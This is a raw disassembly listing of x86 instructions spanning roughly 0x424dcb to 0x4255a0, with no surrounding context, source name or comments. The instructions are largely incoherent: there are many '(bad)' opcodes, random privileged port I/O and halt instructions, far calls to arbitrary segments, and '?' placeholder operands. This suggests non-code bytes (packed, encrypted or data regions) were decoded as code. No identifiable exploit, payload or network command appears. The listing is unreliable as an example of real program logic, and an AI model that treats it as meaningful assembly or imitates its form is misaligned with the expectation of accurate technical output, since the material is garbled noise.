  424dcb:	loop   0x424dc8
  424dcd:	iret   
  424dce:	xchg   DWORD PTR ds:0x5f39ba2a,ecx
  424dd4:	enter  0xb841,0xa5
  424dd8:	popa   
  424dd9:	jecxz  0x424d75
  424ddb:	leave  
  424ddc:	push   ds
  424ddd:	call   0xcf0685db
  424de2:	gs xor al,0x15
  424de5:	out    dx,al
  424de6:	jg     0x424e32
  424de8:	lock xor al,0x1f
  424deb:	inc    edi
  424dec:	ds ret 
  424dee:	xor    al,0x7
  424df0:	out    dx,eax
  424df1:	stos   BYTE PTR es:[edi],al
  424df2:	loop   0x424d9c
  424df4:	fist   WORD PTR [esi-0x13]
  424df7:	mov    esi,DWORD PTR [ebx-0x3b456645]
  424dfd:	adc    DWORD PTR [edi+0x7aa0ee85],ecx
  424e03:	push   eax
  424e04:	push   esp
  424e05:	sub    ch,BYTE PTR [esi]
  424e07:	jb     0x424e64
  424e09:	jbe    0x424db7
  424e0b:	mov    ?,WORD PTR [edx-0x74]
  424e0e:	or     DWORD PTR [edx+0x2f],esi
  424e11:	imul   esp,DWORD PTR [edx+eiz*1+0x17],0x8c0a667d
  424e19:	jb     0x424e87
  424e1b:	push   esp
  424e1c:	aaa    
  424e1d:	mov    al,cl
  424e1f:	test   BYTE PTR [edx-0x49],al
  424e22:	sbb    eax,0x7bf74223
  424e27:	sbb    eax,0x5f345734
  424e2c:	inc    edi
  424e2d:	mov    esp,0x4a5c4f35
  424e32:	cmp    BYTE PTR [edi-0x3c6a61cb],cl
  424e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e39:	dec    ebx
  424e3a:	fidivr DWORD PTR [esi]
  424e3c:	push   0xffffffb7
  424e3e:	add    al,0x4
  424e40:	(bad)  
  424e41:	stc    
  424e42:	iret   
  424e43:	push   edi
  424e44:	mov    DWORD PTR [edx],0x91d8c952
  424e4a:	mov    esp,0x300b47db
  424e4f:	or     BYTE PTR [esi],dh
  424e51:	enter  0xd200,0x15
  424e55:	fild   DWORD PTR [eax+0x50f00fe0]
  424e5b:	inc    esi
  424e5c:	shr    DWORD PTR [ebx],cl
  424e5e:	ins    BYTE PTR es:[edi],dx
  424e5f:	stos   BYTE PTR es:[edi],al
  424e60:	or     al,0xeb
  424e62:	add    ah,cl
  424e64:	cmp    al,0xa5
  424e66:	in     al,dx
  424e67:	sub    esi,edi
  424e69:	xchg   esp,esi
  424e6b:	add    DWORD PTR [edx],0xb
  424e6e:	fcomp  DWORD PTR [eax+0x45718857]
  424e74:	mov    ebx,0x26e333cc
  424e79:	test   al,0x1e
  424e7b:	stc    
  424e7c:	cmp    ebx,DWORD PTR [edx+0x4b]
  424e7f:	rcl    BYTE PTR [edx],cl
  424e81:	enter  0xa2bf,0x15
  424e85:	call   0xcdeb:0xb0417605
  424e8c:	dec    ecx
  424e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e8e:	out    dx,eax
  424e8f:	test   BYTE PTR [ebp-0x47],0x5e
  424e93:	push   ss
  424e94:	js     0x424eb2
  424e96:	or     BYTE PTR [esi-0x28c58de9],bl
  424e9c:	sub    bl,BYTE PTR [edi]
  424e9e:	out    dx,eax
  424e9f:	gs mov dl,bl
  424ea2:	test   eax,0x71d2b112
  424ea7:	fs jae 0x424f0e
  424eaa:	sub    eax,0xa756cef3
  424eaf:	fist   WORD PTR [ebx]
  424eb1:	fnstcw WORD PTR [ebx-0x60e6bd01]
  424eb7:	push   ecx
  424eb8:	inc    ebp
  424eb9:	jnp    0x424ecf
  424ebb:	gs push 0xc76865a6
  424ec1:	(bad)  [esi]
  424ec3:	les    edi,FWORD PTR ds:0xa502de8f
  424ec9:	ret    
  424eca:	mov    cl,0x78
  424ecc:	outs   dx,BYTE PTR ds:[esi]
  424ecd:	push   ss
  424ece:	xor    BYTE PTR [edi],bh
  424ed0:	mov    eax,0x9605fb0e
  424ed5:	mov    BYTE PTR [ebp+0x68],cl
  424ed8:	mov    ebp,0x6fd6f830
  424edd:	ins    DWORD PTR es:[edi],dx
  424ede:	dec    ecx
  424edf:	adc    BYTE PTR [edx+0x2a00ec5c],0xc2
  424ee6:	sbb    BYTE PTR [edi+0x28],bh
  424ee9:	sbb    cl,BYTE PTR [edi]
  424eeb:	ret    
  424eec:	imul   ebp,DWORD PTR [edx-0x7c],0x8c44d5b8
  424ef3:	mov    ebp,0xc290151d
  424ef8:	cmp    BYTE PTR [eax+edi*8-0x577cf1f5],cl
  424eff:	iret   
  424f00:	rol    DWORD PTR [edi-0x5b64d04e],1
  424f06:	loope  0x424f77
  424f08:	inc    ebp
  424f09:	enter  0xe9a9,0x2a
  424f0d:	fstp   QWORD PTR [ebp+ecx*2-0x66]
  424f11:	push   ebx
  424f12:	mov    ds:0xec0c3e5e,al
  424f17:	adc    dh,cl
  424f19:	xchg   ebx,eax
  424f1a:	repz dec esi
  424f1c:	stos   DWORD PTR es:[edi],eax
  424f1d:	and    edx,edx
  424f1f:	sbb    BYTE PTR [ebp+eax*1+0x77],ah
  424f23:	retf   0xc2b7
  424f26:	xchg   ebp,eax
  424f27:	inc    edx
  424f28:	mul    DWORD PTR ds:0x423fad5a
  424f2e:	dec    ebx
  424f2f:	mov    esi,0x74e66e84
  424f34:	sub    eax,DWORD PTR [eax-0x2d3d6ee5]
  424f3a:	add    bl,BYTE PTR ds:0xf1801544
  424f40:	cmp    DWORD PTR [eax+0x6ceb2618],edx
  424f46:	and    DWORD PTR [ebp-0x6b],edx
  424f49:	jmp    0x424ee1
  424f4b:	addr16 or eax,0xa85264ad
  424f51:	push   0xffffffb8
  424f53:	imul   edx,DWORD PTR [edi+0x45b6d33],0xa1d0be01
  424f5d:	push   cs
  424f5e:	mov    edi,0x6a18bbde
  424f63:	icebp  
  424f64:	jmp    0xa1086a1e
  424f69:	sub    al,0x99
  424f6b:	sbb    DWORD PTR [edi-0x22],ecx
  424f6e:	xchg   ebp,eax
  424f6f:	imul   ebx,esi,0xd745b0a1
  424f75:	mov    eax,0x3e55e55d
  424f7a:	stos   BYTE PTR es:[di],al
  424f7c:	inc    edx
  424f7d:	pushf  
  424f7e:	add    DWORD PTR ss:[eax-0x49],0xfffffff2
  424f83:	sub    eax,0xc4e464b9
  424f88:	(bad)  
  424f89:	jmp    DWORD PTR [edx]
  424f8b:	scas   al,BYTE PTR es:[edi]
  424f8c:	fcom   DWORD PTR [ebx-0x7bc62994]
  424f92:	add    edi,DWORD PTR [eax-0x51dc6259]
  424f98:	jnp    0x424f9c
  424f9a:	jle    0x424f4e
  424f9c:	push   edi
  424f9d:	nop
  424f9e:	int3   
  424f9f:	inc    esi
  424fa0:	js     0x424f75
  424fa2:	sub    al,0x2
  424fa4:	adc    DWORD PTR [edi+0x4179c5be],ebp
  424faa:	into   
  424fab:	inc    edi
  424fac:	push   es
  424fad:	adc    bl,BYTE PTR [edx]
  424faf:	push   0x56c0e9f5
  424fb4:	repz loop 0x424f49
  424fb7:	arpl   WORD PTR [ebp+0x40],si
  424fba:	xor    al,0x6d
  424fbc:	es sbb al,0x46
  424fbf:	stc    
  424fc0:	pop    eax
  424fc1:	(bad)  
  424fc2:	jmp    0x42500d
  424fc4:	js     0x424fea
  424fc6:	shl    BYTE PTR [eax+0x67f24b48],0xf1
  424fcd:	sahf   
  424fce:	mov    al,dl
  424fd0:	ret    0xab92
  424fd3:	add    dh,dh
  424fd5:	push   0x9c4f98f1
  424fda:	dec    ecx
  424fdb:	mov    dh,0xf0
  424fdd:	and    al,0x9a
  424fdf:	pop    edx
  424fe0:	cmp    eax,0x4445783d
  424fe5:	mov    al,0x22
  424fe7:	(bad)  
  424fe8:	adc    eax,0xcb8158cb
  424fed:	pop    ecx
  424fee:	addr16 dec ecx
  424ff0:	mov    ds:0x4b32ba63,al
  424ff5:	mov    edx,ebp
  424ff7:	cdq    
  424ff8:	xchg   ch,cl
  424ffa:	sahf   
  424ffb:	pusha  
  424ffc:	push   esp
  424ffd:	pop    ebp
  424ffe:	jmp    0x6c43f7b6
  425003:	popa   
  425004:	gs popf 
  425006:	jl     0x425038
  425008:	sub    eax,0xf9255e7f
  42500d:	jno    0x424fd7
  42500f:	push   edx
  425010:	inc    ebp
  425011:	cli    
  425012:	pop    ecx
  425013:	mov    DWORD PTR [ebx-0x42],esp
  425016:	or     DWORD PTR [eax-0x7d],edi
  425019:	jbe    0x424fb7
  42501b:	xchg   edx,eax
  42501c:	adc    al,0xc
  42501e:	jmp    0xee2f:0xa486fdf3
  425025:	inc    esp
  425026:	js     0x424fdc
  425028:	ror    DWORD PTR [edx],0x5d
  42502b:	fisubr DWORD PTR [eax]
  42502d:	cmp    bl,al
  42502f:	sub    BYTE PTR [esi],ch
  425031:	sub    ebx,DWORD PTR [ecx+ecx*4]
  425034:	outs   dx,DWORD PTR ds:[esi]
  425035:	sub    eax,0xdcf50478
  42503a:	or     DWORD PTR [edx+0x26],ebp
  42503d:	shl    DWORD PTR [ecx],cl
  42503f:	cld    
  425040:	sbb    al,BYTE PTR [edi]
  425042:	and    eax,0xd65930e5
  425047:	pop    edi
  425048:	arpl   WORD PTR [ecx-0x3ef93528],sp
  42504e:	aam    0x3e
  425050:	cmp    esi,ebx
  425052:	rol    al,cl
  425054:	mov    cl,0x73
  425056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425057:	add    eax,0xa729ee79
  42505c:	mov    eax,0x63a1ac62
  425061:	lods   al,BYTE PTR ds:[esi]
  425062:	sbb    DWORD PTR [esi-0xb],edi
  425065:	mov    ah,0x2b
  425067:	leave  
  425068:	dec    ecx
  425069:	add    dl,BYTE PTR [ecx-0xf]
  42506c:	leave  
  42506d:	pop    esp
  42506e:	ja     0x4250df
  425070:	push   edx
  425071:	fisubr WORD PTR [eax+0x1d2f9e76]
  425077:	push   cs
  425078:	push   ebx
  425079:	or     DWORD PTR [edi+0x794ab869],edx
  42507f:	mov    WORD PTR [edi+0x73],?
  425082:	cmp    BYTE PTR [edx],bh
  425084:	push   es
  425085:	outs   dx,DWORD PTR ds:[esi]
  425086:	lds    ebp,FWORD PTR [ebx+0x6a]
  425089:	jle    0x42502b
  42508b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42508c:	pop    esp
  42508d:	and    bh,ch
  42508f:	or     al,0xe3
  425091:	cmp    al,0xfd
  425093:	cmp    BYTE PTR [eax+0x43],bh
  425096:	lods   eax,DWORD PTR gs:[esi]
  425098:	repz (bad) 
  42509a:	cmp    al,0xcc
  42509c:	cmp    al,0x93
  42509e:	(bad)  
  42509f:	add    DWORD PTR [esi+0x6615b3f4],esi
  4250a5:	shr    DWORD PTR [edx],cl
  4250a7:	fsubr  QWORD PTR [ebx*8+0x4ac67e6c]
  4250ae:	mov    DWORD PTR [ebx],esi
  4250b0:	push   edi
  4250b1:	mov    ah,0x7b
  4250b3:	push   ss
  4250b4:	xor    BYTE PTR [esi+0x2c],ah
  4250b7:	fdiv   DWORD PTR [edi+0x2943a566]
  4250bd:	outs   dx,BYTE PTR ds:[esi]
  4250be:	and    al,0x14
  4250c0:	cwde   
  4250c1:	jae    0x4250e7
  4250c3:	out    dx,eax
  4250c4:	test   eax,0xfd3f7740
  4250c9:	sbb    al,BYTE PTR [eax-0x5ab8fcc1]
  4250cf:	call   0xe9f8b471
  4250d4:	mov    ah,0x28
  4250d6:	dec    edi
  4250d7:	lahf   
  4250d8:	adc    eax,0x9199bf73
  4250dd:	fld    st(2)
  4250df:	pop    esi
  4250e0:	js     0x42510b
  4250e2:	daa    
  4250e3:	adc    edx,ecx
  4250e5:	in     eax,0xd
  4250e7:	jbe    0x425121
  4250e9:	cli    
  4250ea:	and    DWORD PTR [ecx+0x39188cc8],ebx
  4250f0:	je     0x425091
  4250f2:	fld    DWORD PTR [esi+0x21]
  4250f5:	retf   0xd423
  4250f8:	rol    esp,0x21
  4250fb:	popf   
  4250fc:	mov    DWORD PTR [eax+edi*1],0xf25fa2a
  425103:	mov    bh,cl
  425105:	mov    cl,0xc8
  425107:	rcr    DWORD PTR [edi+0x11],0x41
  42510b:	mov    ebx,0x827f2211
  425110:	fst    DWORD PTR [ecx]
  425112:	sbb    ch,BYTE PTR [esi+0x1c]
  425115:	das    
  425116:	pop    ebp
  425117:	(bad)  
  425118:	std    
  425119:	pusha  
  42511a:	jmp    0xfc119868
  42511f:	sahf   
  425120:	or     eax,0xffffffca
  425123:	cmp    edx,DWORD PTR [ebx]
  425125:	rol    ah,0xb2
  425128:	lods   eax,DWORD PTR ds:[esi]
  425129:	mov    eax,0xbedea625
  42512e:	mov    ah,0xbe
  425130:	dec    esi
  425131:	aad    0x52
  425133:	test   al,0xcd
  425135:	xchg   esi,eax
  425136:	xchg   esi,eax
  425137:	and    BYTE PTR [esi+0x52],cl
  42513a:	sub    al,BYTE PTR [edx]
  42513c:	popf   
  42513d:	sbb    BYTE PTR [esi+0x4108d6a9],cl
  425143:	sub    DWORD PTR ss:[edx],ebp
  425146:	fstp   QWORD PTR [ebx]
  425148:	cmc    
  425149:	and    esp,DWORD PTR [ebp+ebx*1-0x7c38d5cf]
  425150:	push   ds
  425151:	loop   0x425114
  425153:	call   0x8769fe63
  425158:	mov    ah,BYTE PTR [edx]
  42515a:	fisttp WORD PTR [esi]
  42515c:	xor    ch,BYTE PTR [ebp-0x1e]
  42515f:	inc    ecx
  425160:	pusha  
  425161:	dec    ebp
  425162:	push   esp
  425163:	xchg   ebp,eax
  425164:	or     eax,0xadffa353
  425169:	out    dx,eax
  42516a:	cld    
  42516b:	leave  
  42516c:	mov    esi,0x8bdd30e4
  425171:	or     BYTE PTR [eax+edi*8+0x58],ah
  425175:	das    
  425176:	and    DWORD PTR [eax+0x67ce4b35],esp
  42517c:	out    dx,eax
  42517d:	sahf   
  42517e:	jae    0x4251f0
  425180:	jp     0x42514c
  425182:	xor    dl,BYTE PTR [ecx+edi*1]
  425185:	add    cl,BYTE PTR [ebp+0x51414496]
  42518b:	icebp  
  42518c:	loopne 0x425201
  42518e:	push   eax
  42518f:	loopne 0x425154
  425191:	sub    DWORD PTR [ebp+0x3c],edx
  425194:	jno    0x4251f3
  425196:	stos   DWORD PTR es:[edi],eax
  425197:	jle    0x4251db
  425199:	dec    edx
  42519a:	push   eax
  42519b:	sub    eax,0x6ed9fd95
  4251a0:	inc    ebx
  4251a1:	pop    ebp
  4251a2:	(bad)  
  4251a3:	cmp    al,0xed
  4251a5:	(bad)  
  4251a6:	xor    esp,DWORD PTR [esi+ebp*2]
  4251a9:	popa   
  4251aa:	mov    edx,0x7e9c7689
  4251af:	sub    BYTE PTR [ebx],al
  4251b1:	aam    0xba
  4251b3:	repz pop esi
  4251b5:	std    
  4251b6:	xor    DWORD PTR [ebx+0x7ab1fd80],esp
  4251bc:	xchg   esi,eax
  4251bd:	into   
  4251be:	fwait
  4251bf:	cdq    
  4251c0:	xchg   esi,eax
  4251c1:	mov    BYTE PTR [esi+0x7f],cl
  4251c4:	dec    edi
  4251c5:	aaa    
  4251c6:	push   es
  4251c7:	into   
  4251c8:	push   ecx
  4251c9:	mov    dh,0x4
  4251cb:	nop
  4251cc:	add    ebx,0xfffffffa
  4251cf:	dec    edx
  4251d0:	mov    eax,0x7f114aa6
  4251d5:	cdq    
  4251d6:	outs   dx,DWORD PTR ds:[esi]
  4251d7:	or     eax,0x2a0968a
  4251dc:	push   ebx
  4251dd:	xchg   ecx,eax
  4251de:	scas   eax,DWORD PTR es:[edi]
  4251df:	add    esp,edx
  4251e1:	push   eax
  4251e2:	inc    ecx
  4251e3:	mov    dh,0x56
  4251e5:	test   DWORD PTR [edx+0x32],0xe381ba75
  4251ec:	jl     0x4251e6
  4251ee:	dec    edi
  4251ef:	int    0x1f
  4251f1:	xchg   edx,eax
  4251f2:	mov    ds:0xd27f3b57,eax
  4251f7:	mov    ebx,0xd3326f6a
  4251fc:	pop    ebx
  4251fd:	jo     0x4251ce
  4251ff:	add    bl,al
  425201:	(bad)  
  425202:	jl     0x425195
  425204:	sbb    ebp,DWORD PTR [eax+ebp*2-0x47]
  425208:	js     0x42521e
  42520a:	jp     0x4251fc
  42520c:	sbb    DWORD PTR ds:0x9410a755,eax
  425212:	jo     0x42526d
  425214:	jae    0x425217
  425216:	call   0x2c22:0xc7af3ced
  42521d:	in     al,dx
  42521e:	not    BYTE PTR [ebp*1+0x163a449d]
  425225:	mov    ecx,0x8f5d6332
  42522a:	mov    bh,ch
  42522c:	loopne 0x4251b6
  42522e:	inc    esp
  42522f:	adc    eax,0x6501cebf
  425234:	xchg   DWORD PTR ds:0x8854d4ac,edi
  42523a:	pop    ebx
  42523b:	push   ss
  42523c:	loopne 0x4252a7
  42523e:	leave  
  42523f:	ficom  DWORD PTR ds:0x48bf316e
  425245:	ret    
  425246:	js     0x42521b
  425248:	xchg   ebp,eax
  425249:	adc    al,0x60
  42524b:	mov    edx,0x485d7432
  425250:	retf   0x5608
  425253:	mov    cl,0x3d
  425255:	xchg   ecx,eax
  425256:	into   
  425257:	inc    esp
  425258:	(bad)  
  425259:	js     0x425292
  42525b:	std    
  42525c:	cmp    eax,0x619c22b2
  425261:	fild   QWORD PTR fs:[edx]
  425264:	arpl   WORD PTR [ecx+ebp*1-0x674b0219],cx
  42526b:	jmp    0x89648b97
  425270:	ins    BYTE PTR es:[edi],dx
  425271:	add    eax,0x699a4ece
  425276:	or     DWORD PTR [edx],esi
  425278:	cwde   
  425279:	out    dx,eax
  42527a:	and    al,0xcb
  42527c:	mov    bl,al
  42527e:	call   0x147d:0x5d84d2f
  425285:	sub    ch,bl
  425287:	(bad)  
  425289:	xor    al,0xfb
  42528b:	xchg   ecx,eax
  42528c:	or     DWORD PTR [ebx-0x8211ec3],edx
  425292:	mov    ch,0x46
  425294:	mov    ecx,0x63a3155c
  425299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42529a:	dec    ebp
  42529b:	(bad)  
  42529d:	pop    ss
  42529e:	mov    WORD PTR [ebp-0x502ea37f],?
  4252a4:	or     eax,0x62e36f53
  4252a9:	or     eax,0xb65c028a
  4252ae:	aaa    
  4252af:	and    BYTE PTR [ebx-0x72699b74],0x29
  4252b6:	aam    0x76
  4252b8:	push   ss
  4252b9:	mov    esi,0xb01d5139
  4252be:	push   esi
  4252bf:	pop    edi
  4252c0:	fstp   DWORD PTR [esi+0x31]
  4252c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252c4:	fs jb  0x4252c2
  4252c7:	pop    ebx
  4252c8:	test   dh,dh
  4252ca:	mov    BYTE PTR [edi+0x4afcf4f2],dh
  4252d0:	xor    al,0xb3
  4252d2:	das    
  4252d3:	cs cli 
  4252d5:	mov    ebx,DWORD PTR [ecx]
  4252d7:	cdq    
  4252d8:	(bad)  
  4252d9:	xchg   edi,eax
  4252da:	mov    ebx,0xc92e4b16
  4252df:	mul    BYTE PTR [ecx-0x28975565]
  4252e5:	in     al,dx
  4252e6:	and    BYTE PTR [edx],bh
  4252e8:	xor    al,BYTE PTR [edi+0x61]
  4252eb:	mov    eax,0x1f45c59d
  4252f0:	jno    0x42530a
  4252f2:	adc    ch,BYTE PTR [edi]
  4252f4:	add    ch,bh
  4252f6:	ins    BYTE PTR es:[edi],dx
  4252f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252f8:	stos   BYTE PTR es:[edi],al
  4252f9:	adc    DWORD PTR [ecx+ecx*8],ecx
  4252fc:	inc    edi
  4252fd:	sub    eax,0x4e301983
  425302:	and    esi,DWORD PTR [ebp-0x45]
  425305:	mov    ebx,ds
  425307:	jle    0x4252c5
  425309:	repz test al,0xa
  42530c:	scas   eax,DWORD PTR es:[edi]
  42530d:	jnp    0x42534d
  42530f:	dec    esi
  425310:	fdivr  QWORD PTR [edx-0x35224684]
  425316:	inc    esp
  425317:	add    eax,0x9e74a9e8
  42531c:	imul   eax,DWORD PTR [ebx-0x2cdab9f1],0xf48c3ba5
  425326:	aaa    
  425327:	push   ebx
  425328:	outs   dx,DWORD PTR ds:[esi]
  425329:	stos   DWORD PTR es:[edi],eax
  42532a:	pushf  
  42532b:	daa    
  42532c:	mov    eax,0x8eb074a2
  425331:	mov    ebp,DWORD PTR [ebx]
  425333:	mov    esi,0xb2b5bd0a
  425338:	inc    ebx
  425339:	clc    
  42533a:	test   DWORD PTR [edx-0x728d2db3],ecx
  425340:	mov    WORD PTR [ebp+0x52],gs
  425343:	cmp    ecx,DWORD PTR [eax+ebp*8]
  425346:	sub    DWORD PTR [ecx-0x47ad27ee],esi
  42534c:	inc    esp
  42534d:	(bad)  
  42534e:	enter  0x151b,0x32
  425352:	dec    esi
  425353:	fistp  DWORD PTR ds:[ebx+0x3a]
  425357:	and    ebx,DWORD PTR [eax+0x36]
  42535a:	jae    0x425389
  42535c:	xchg   ebp,eax
  42535d:	or     ah,BYTE PTR [esi+0x6f]
  425360:	pop    esp
  425361:	and    DWORD PTR [ebp+0x62bb087c],ecx
  425367:	hlt    
  425368:	mov    BYTE PTR [edx+0x1aacc244],0x58
  42536f:	stos   BYTE PTR es:[edi],al
  425370:	mov    dl,0xe3
  425372:	scas   eax,DWORD PTR es:[edi]
  425373:	xor    BYTE PTR [ebp+0x58],bl
  425376:	pop    ds
  425377:	mov    dl,0x4
  425379:	aaa    
  42537a:	or     BYTE PTR [edi+0x4a],0x11
  42537e:	into   
  42537f:	xchg   edi,eax
  425380:	sub    dh,dl
  425382:	in     al,dx
  425383:	repnz push edx
  425385:	in     eax,dx
  425386:	fwait
  425387:	rcr    bl,0x18
  42538a:	pop    eax
  42538b:	sbb    ah,BYTE PTR [ecx]
  42538d:	adc    esi,DWORD PTR [ebp-0x170c1aef]
  425393:	cs loop 0x42536d
  425396:	or     eax,eax
  425398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425399:	stc    
  42539a:	pop    ebp
  42539b:	and    eax,0x7c8b6812
  4253a0:	dec    ebp
  4253a1:	and    ecx,0x85fbf469
  4253a7:	sub    BYTE PTR [eax],bl
  4253a9:	mov    BYTE PTR [esi],ah
  4253ab:	and    BYTE PTR [esi+0x6f],dh
  4253ae:	add    edx,DWORD PTR [eax+esi*2+0x7c]
  4253b2:	pop    edi
  4253b3:	lea    esi,[esi+0x7b]
  4253b6:	push   ss
  4253b7:	jge    0x4253b0
  4253b9:	add    DWORD PTR [ecx],eax
  4253bb:	les    edi,FWORD PTR [ebp-0x41bbcb35]
  4253c1:	out    0x54,eax
  4253c3:	push   ds
  4253c4:	and    DWORD PTR [esi-0x15b68e75],ebp
  4253ca:	iret   
  4253cb:	push   edi
  4253cc:	mov    al,ds:0xdf4b3a9f
  4253d1:	cmc    
  4253d2:	es hlt 
  4253d4:	lahf   
  4253d5:	ins    BYTE PTR es:[edi],dx
  4253d6:	adc    DWORD PTR [edx-0x737f940e],0xffffffce
  4253dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253de:	jne    0x42544a
  4253e0:	lds    edi,FWORD PTR [ebx]
  4253e2:	popa   
  4253e3:	data16 aam 0xb4
  4253e6:	add    DWORD PTR [eax+0x29d9d4e0],esi
  4253ec:	or     al,0xe0
  4253ee:	mov    al,ds:0xa0147cd4
  4253f3:	fnstcw WORD PTR [edx+esi*8-0x20]
  4253f7:	out    dx,al
  4253f8:	cmp    al,ch
  4253fa:	pushf  
  4253fb:	test   DWORD PTR [edx-0x4c055654],eax
  425401:	ror    BYTE PTR [edi+0x57],1
  425404:	in     al,dx
  425405:	and    ch,dh
  425407:	cld    
  425408:	or     BYTE PTR [ebp+0x57d11602],ch
  42540e:	adc    dl,BYTE PTR [esi-0x60]
  425411:	dec    ebp
  425412:	jno    0x4253b7
  425414:	xchg   sp,ax
  425416:	sbb    BYTE PTR [esi-0x6599e7fe],dh
  42541c:	bound  esi,QWORD PTR [edi+0x3af9a50b]
  425422:	cli    
  425423:	cli    
  425424:	cmp    DWORD PTR [ecx],ebx
  425426:	scas   eax,DWORD PTR es:[edi]
  425427:	out    0x46,al
  425429:	rol    dh,1
  42542b:	and    eax,0x6326f61d
  425430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425431:	(bad)  
  425432:	push   0xffffffda
  425434:	dec    eax
  425435:	and    bl,BYTE PTR [eax+esi*4]
  425438:	out    dx,al
  425439:	mov    eax,0xc509915f
  42543e:	movq   mm3,QWORD PTR [esi-0x55]
  425442:	push   ss
  425443:	sbb    eax,0x4e748b72
  425448:	mov    bl,BYTE PTR [edx+ebx*2]
  42544b:	sub    BYTE PTR [eax],0x8f
  42544e:	pusha  
  42544f:	icebp  
  425450:	fdiv   QWORD PTR [esi-0x660b49b4]
  425456:	hlt    
  425457:	sbb    eax,0x69f71fcc
  42545c:	jle    0x4253ed
  42545e:	inc    edx
  42545f:	lahf   
  425460:	and    BYTE PTR [edx+0x2c234652],0x65
  425467:	imul   esp,DWORD PTR [edx-0xd],0x29
  42546b:	jge    0x4254d8
  42546d:	adc    ecx,DWORD PTR [edi]
  42546f:	cli    
  425470:	mov    BYTE PTR [eax+0x63],bh
  425473:	xchg   edx,eax
  425474:	loop   0x42547f
  425476:	cmp    ebp,DWORD PTR [esi+eiz*1]
  425479:	or     al,0xe2
  42547b:	mov    bh,0x15
  42547d:	ret    0x10c7
  425480:	jb     0x4254ea
  425482:	(bad)  
  425483:	repz push ecx
  425485:	xor    al,0xa5
  425487:	adc    BYTE PTR [ebx],ah
  425489:	pop    ecx
  42548a:	xchg   BYTE PTR [ebp+0x45],dl
  42548d:	daa    
  42548e:	or     bl,bh
  425490:	cmp    eax,eax
  425492:	sbb    BYTE PTR [edx+ecx*4],cl
  425495:	and    ch,BYTE PTR [eax]
  425497:	rcl    ch,cl
  425499:	jo     0x425440
  42549b:	and    al,0xcf
  42549d:	jno    0x425511
  42549f:	sti    
  4254a0:	test   DWORD PTR [ebx-0x44f30459],0x3cc7dbe9
  4254aa:	push   esp
  4254ab:	and    edi,DWORD PTR [esi-0xf0f77b4]
  4254b1:	ret    
  4254b2:	out    0x9f,eax
  4254b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254b5:	push   cs
  4254b6:	cli    
  4254b7:	cwde   
  4254b8:	sub    eax,DWORD PTR [esi+0x68]
  4254bb:	shr    eax,0xd8
  4254be:	mov    ebp,0x681240f
  4254c3:	inc    ebp
  4254c4:	imul   edi,esi,0x43
  4254c7:	cmc    
  4254c8:	cmp    eax,0xedd13589
  4254cd:	sbb    dh,al
  4254cf:	es jb  0x425513
  4254d2:	lods   eax,DWORD PTR ds:[esi]
  4254d3:	ds push ds
  4254d5:	ret    
  4254d6:	les    ebx,FWORD PTR [esi]
  4254d8:	xchg   ebp,eax
  4254d9:	es popf 
  4254db:	cmc    
  4254dc:	shl    DWORD PTR [edi+esi*1-0x70],1
  4254e0:	iret   
  4254e1:	cld    
  4254e2:	mov    cl,0x26
  4254e4:	inc    eax
  4254e5:	repz sub bh,BYTE PTR [ebx-0x6]
  4254e9:	sbb    dl,BYTE PTR [ebx]
  4254eb:	enter  0x136a,0x14
  4254ef:	lds    edi,FWORD PTR ds:0xae7bb899
  4254f5:	sar    eax,cl
  4254f7:	mov    ?,eax
  4254f9:	xchg   ecx,eax
  4254fa:	mov    edx,DWORD PTR [ebx]
  4254fc:	cs retf 0xaf0f
  425500:	fstp   QWORD PTR [ecx-0x4854246f]
  425506:	mov    ?,WORD PTR [esi+0x39e79d32]
  42550c:	div    DWORD PTR [edi]
  42550e:	(bad)  
  42550f:	mov    ds:0x616d231,eax
  425514:	push   esi
  425515:	pop    edx
  425516:	(bad)  [edi-0x6d2c2e52]
  42551c:	out    0xf1,eax
  42551e:	in     al,dx
  42551f:	pop    eax
  425520:	inc    esi
  425521:	repz push esp
  425523:	(bad)  
  425524:	pop    edi
  425525:	outs   dx,DWORD PTR ds:[esi]
  425526:	inc    eax
  425527:	jle    0x4254e0
  425529:	sub    eax,esi
  42552b:	inc    esp
  42552c:	stos   DWORD PTR es:[edi],eax
  42552d:	sub    dl,BYTE PTR [eax-0x759c9f8e]
  425533:	mov    DWORD PTR [esi+0x457b3d9],0x72ca9e5
  42553d:	xchg   edi,eax
  42553e:	sbb    BYTE PTR [ebx-0x286a7e4b],cl
  425544:	in     al,0x23
  425546:	popf   
  425547:	inc    ebx
  425548:	loopne 0x4254d6
  42554a:	daa    
  42554b:	rcr    BYTE PTR [eax-0xb672542],1
  425551:	mov    BYTE PTR [esi],0x95
  425554:	xor    al,0x25
  425556:	icebp  
  425557:	dec    esp
  425558:	test   DWORD PTR [ebx+eax*2-0x67],esp
  42555c:	dec    edx
  42555d:	scas   al,BYTE PTR es:[edi]
  42555e:	jb     0x425526
  425560:	les    edx,FWORD PTR [ebp-0x12]
  425563:	scas   al,BYTE PTR es:[edi]
  425564:	les    ebx,FWORD PTR [ecx]
  425566:	ds dec ebx
  425568:	sub    BYTE PTR [ebp-0x37],cl
  42556b:	pop    ecx
  42556c:	stc    
  42556d:	jns    0x425532
  42556f:	lea    edx,[ebp+0xfac43b5]
  425575:	rcl    BYTE PTR [ebp+0x5b],cl
  425578:	pop    es
  425579:	es jno 0x42551d
  42557c:	mov    ah,0xae
  42557e:	in     eax,dx
  42557f:	rcl    DWORD PTR ss:[edi+0x20],cl
  425583:	stos   BYTE PTR es:[edi],al
  425584:	dec    ecx
  425585:	call   0x6453a280
  42558a:	(bad)  
  42558b:	jl     0x425534
  42558d:	dec    eax
  42558e:	int    0xd9
  425590:	lea    edx,[ebx+ebx*2-0x7416be73]
  425597:	imul   ebp,DWORD PTR [ecx],0xffffffba
  42559a:	xchg   esi,eax
  42559b:	lea    ebp,[eax+0xa]
  42559e:	and    eax,ebx
  4255a0:	int    0x7d
